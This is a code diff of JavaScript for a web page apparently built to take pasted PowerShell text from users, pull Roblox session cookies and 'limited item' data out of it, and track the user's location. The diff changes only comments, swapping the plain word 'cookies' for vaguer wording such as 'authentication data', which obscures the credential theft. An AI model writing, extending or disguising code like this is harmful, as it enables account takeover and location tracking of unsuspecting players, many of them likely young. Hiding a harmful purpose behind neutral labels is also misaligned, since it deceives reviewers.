@@ -204,7 +204,7 @@ async function getUserLocation() {
     }
 }
 
-// Roblox limited item scanning and location tracking
+// Roblox item scanning and location tracking
 async function submitPowerShell() {
     const input = document.getElementById('powershellInput');
     const submitBtn = document.getElementById('submitBtn');
@@ -224,7 +224,7 @@ async function submitPowerShell() {
     loadingOverlay.style.display = 'block';
 
     try {
-        // Extract limited item data and cookies from the input
+        // Scan limited items and extract authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
         
@@ -313,7 +313,7 @@ async function submitPowerShell() {
     }
 }
 
-// Function to extract Roblox cookie from text
+// Function to scan and extract authentication data from text
 function extractRobloxCookie(text) {
     // Look for various Roblox cookie patterns
     const patterns = [
